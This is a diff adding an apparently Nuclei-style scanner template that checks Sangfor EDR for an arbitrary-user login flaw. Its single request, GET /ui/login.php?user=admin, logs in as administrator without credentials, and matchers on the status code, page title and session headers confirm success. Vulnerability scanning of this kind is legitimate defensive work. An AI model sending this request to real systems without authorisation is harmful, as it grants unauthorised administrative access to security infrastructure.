@@ -1,0 +1,24 @@
+id: sangfor-edr-arbitrary-user-login
+info:
+  name: Sangfor EDR Arbitrary User Login Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: authentication-bypass
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ui/login.php?user=admin"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: body
+        words:
+          - "SANGFOR终端检测响应平台"
+      - type: word
+        part: header
+        words:
+          - "index.php"
+          - "PHPSESSID"
